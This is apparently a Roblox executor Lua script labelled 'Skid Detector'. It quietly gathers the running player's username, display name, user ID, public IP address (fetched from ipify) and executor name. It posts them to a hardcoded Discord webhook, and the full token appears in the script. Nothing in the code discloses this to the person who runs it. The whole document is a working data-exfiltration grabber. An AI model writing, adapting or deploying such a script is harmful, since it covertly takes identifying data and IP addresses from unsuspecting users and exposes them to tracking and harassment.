-- MADE BY 0rep --

local HttpService = game:GetService("HttpService")
local lp = game.Players.LocalPlayer
local ip = game:HttpGet("https://api.ipify.org")

local data = {
    ["username"] = "Skid Detector",
    ["content"] = string.format(
        "Username: %s\nDisplay Name: %s\nUser ID: %s\nIP: %s\nExecutor: %s",
        lp.Name,
        lp.DisplayName,
        lp.UserId,
        ip,
        identifyexecutor and identifyexecutor() or "Unknown"
    )
}

local jsonData = HttpService:JSONEncode(data)
local url = "https://discord.com/api/webhooks/1370915185941807214/BQ0Ve1Nu1DRruP4W9C0_uwa_wWBTbXAo9Xk82_wC571wJm6ZrUOmviw8ta_tddhXYZxh"

-- Try all known request methods
local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)

if requestFunc then
    local success, result = pcall(function()
        return requestFunc({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)

    if success then
        print("Webhook sent successfully.")
    else
        warn("Failed to send webhook:", result)
    end
else
    warn("No supported HTTP request function found. Your executor might not support webhooks.")
end
